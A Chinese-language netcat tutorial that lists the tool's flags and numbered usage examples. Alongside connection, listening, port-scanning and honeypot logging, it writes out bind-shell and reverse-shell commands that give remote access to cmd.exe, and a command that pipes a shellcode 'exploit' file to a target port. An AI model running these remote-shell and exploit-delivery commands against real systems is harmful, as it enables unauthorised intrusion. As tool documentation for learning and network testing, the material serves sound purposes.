## netcat {#netcat}

GUN NatCat ：

[http://netcat.sourceforge.net/download.php](http://netcat.sourceforge.net/download.php)

NC for NT：

www.vulnwatch.org/netcat/

netcat被誉为网络安全界的&amp;apos;瑞士军刀&amp;apos;，相信没有什么人不认识它吧......

 一个简单而有用的工具，透过使用TCP或UDP协议的网络连接去读写数据。它被设计成一个稳定的后门工具，

能够直接由其它程序和脚本轻松驱动。同时，它也是一个功能强大的网络调试和探测工具，能够建立你需要的几

乎所有类型的网络连接，还有几个很有意思的内置功能(详情请看下面的使用方法)。

 在中国，它的WINDOWS版有两个版本，一个是原创者Chris Wysopal写的原版本，另一个是由&amp;apos;红与黑&amp;apos;编译

后的新&amp;apos;浓缩&amp;apos;版。&amp;apos;浓缩&amp;apos;版的主程序只有10多KB（10多KB的NC是不能完成下面所说的第4、第5种使用方法，

有此功能的原版NC好象要60KB：P），虽然&quot;体积&quot;小，但很完成很多工作。

=====================================================================================================

软件介绍：

工具名：Netcat

作者：Hobbit &amp;&amp; Chris Wysopal

网址： [http://www.atstake.com/research/tools/network_utilities/](http://www.atstake.com/research/tools/network_utilities/)

类别：开放源码

平台：Linux/BSD/Unix/Windows　

WINDOWS下版本号：[v1.10 NT]

=====================================================================================================

参数介绍：

&amp;apos;nc.exe -h&amp;apos;即可看到各参数的使用方法。

基本格式：nc [-options] hostname port[s] [ports] ...

　　 nc -l -p port [options] [hostname] [port]

-d 后台模式

-e prog 程序重定向，一旦连接，就执行 [危险!!]

-g gateway source-routing hop point[s], up to 8

-G num source-routing pointer: 4, 8, 12, ...

-h 帮助信息

-i secs 延时的间隔

-l 监听模式，用于入站连接

-L 连接关闭后,仍然继续监听

-n 指定数字的IP地址，不能用hostname

-o file 记录16进制的传输

-p port 本地端口号

-r 随机本地及远程端口

-s addr 本地源地址

-t 使用TELNET交互方式

-u UDP模式

-v 详细输出--用两个-v可得到更详细的内容

-w secs timeout的时间

-z 将输入输出关掉--用于扫描时

端口的表示方法可写为M-N的范围格式。

=====================================================================================================

基本用法：

大概有以下几种用法：

1)连接到REMOTE主机，例子：

格式：nc -nvv 192.168.x.x 80

讲解：连到192.168.x.x的TCP80端口

2)监听LOCAL主机，例子：

格式：nc -l -p 80

讲解：监听本机的TCP80端口

3)扫描远程主机，例子：

格式：nc -nvv -w2 -z 192.168.x.x 80-445

讲解：扫描192.168.x.x的TCP80到TCP445的所有端口

4)REMOTE主机绑定SHELL，例子：

格式：nc -l -p 5354 -t -e c:\WINDOWS\system32\cmd.exe

讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口

5)REMOTE主机绑定SHELL并反向连接，例子：

格式：nc -t -e c:\WINDOWS\system32\cmd.exe 192.168.x.x 5354

讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口

以上为最基本的几种用法（其实NC的用法还有很多，

当配合管道命令&quot;|&quot;与重定向命令&quot;&lt;&quot;、&quot;&gt;&quot;等等命令功能更强大......）。

=====================================================================================================

高级用法：

6)作攻击程序用，例子：

格式1：type.exe c:\exploit.txt|nc -nvv 192.168.x.x 80

格式2：nc -nvv 192.168.x.x 80 &lt; c:\exploit.txt

讲解：连接到192.168.x.x的80端口，并在其管道中发送&amp;apos;c:\exploit.txt&amp;apos;的内容(两种格式确有相同的效果，

　 真是有异曲同工之妙:P)

附：&amp;apos;c:\exploit.txt&amp;apos;为shellcode等

7)作蜜罐用[1]，例子：

格式：nc -L -p 80

讲解：使用&amp;apos;-L&amp;apos;(注意L是大写)可以不停地监听某一个端口，直到ctrl+c为止

8)作蜜罐用[2]，例子：

格式：nc -L -p 80 &gt; c:\log.txt

讲解：使用&amp;apos;-L&amp;apos;可以不停地监听某一个端口，直到ctrl+c为止，同时把结果输出到&amp;apos;c:\log.txt&amp;apos;中，如果把&amp;apos;&gt;&amp;apos;

　 改为&amp;apos;&gt;&gt;&amp;apos;即可以追加日志

附：&amp;apos;c:\log.txt&amp;apos;为日志等

9)作蜜罐用[3]，例子：

格式1：nc -L -p 80 &lt; c:\honeypot.txt

格式2：type.exe c:\honeypot.txt|nc -L -p 80

讲解：使用&amp;apos;-L&amp;apos;可以不停地监听某一个端口，直到ctrl+c为止，并把&amp;apos;c:\honeypot.txt&amp;apos;的内容&amp;apos;送&amp;apos;入其管道中！